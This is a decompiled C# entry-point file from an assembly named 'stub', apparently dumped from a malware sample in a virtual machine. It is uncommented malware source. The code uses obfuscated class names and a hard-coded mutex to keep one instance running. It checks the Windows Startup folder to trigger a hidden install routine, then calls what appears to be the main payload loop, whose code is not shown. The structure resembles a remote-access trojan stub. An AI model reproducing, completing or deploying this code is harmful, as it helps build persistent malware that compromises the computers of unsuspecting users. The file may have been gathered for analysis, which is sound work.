// Decompiled with JetBrains decompiler
// Type: j.A
// Assembly: stub, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5D061B43-92C3-47A8-A000-0E762F8D5CF4
// Assembly location: C:\Users\gorno\Desktop\vm\Dumps\UnknownName\vdump_00400000.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace j
{
  public class A
  {
    public static string mtx = "H6WadTx73nSVtRX";
    public static bool j = Convert.ToBoolean("False");
    public static bool IR = Convert.ToBoolean("False");
    public static int DL = Convert.ToInt32("20");

    [STAThread]
    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void main(string[] P)
    {
      try
      {
        if (A.j)
        {
          if (!Application.StartupPath.Contains(Interaction.Environ(OK.DR)))
          {
            string Left = (string) null;
            if (P.Length > 0)
              Left = P[0];
            try
            {
              if ((uint) Operators.CompareString(Left, "..", false) > 0U | A.IR)
              {
                if ((uint) Operators.CompareString(Application.StartupPath, Environment.GetFolderPath(Environment.SpecialFolder.Startup), false) > 0U | A.IR)
                  uUrKUuSBRRmTiQczhlKTWtHSbRblp.J();
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            Thread.Sleep(50);
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        Mutex mutex = new Mutex(false, A.mtx);
        if (!mutex.WaitOne(0, false))
        {
          mutex.Close();
          ProjectData.EndApp();
          Application.Exit();
        }
        else
        {
          if (A.DL != 0)
            Thread.Sleep(A.DL);
          OK.ko();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        if (A.DL != 0)
          Thread.Sleep(A.DL);
        OK.ko();
        ProjectData.ClearProjectError();
      }
    }
  }
}
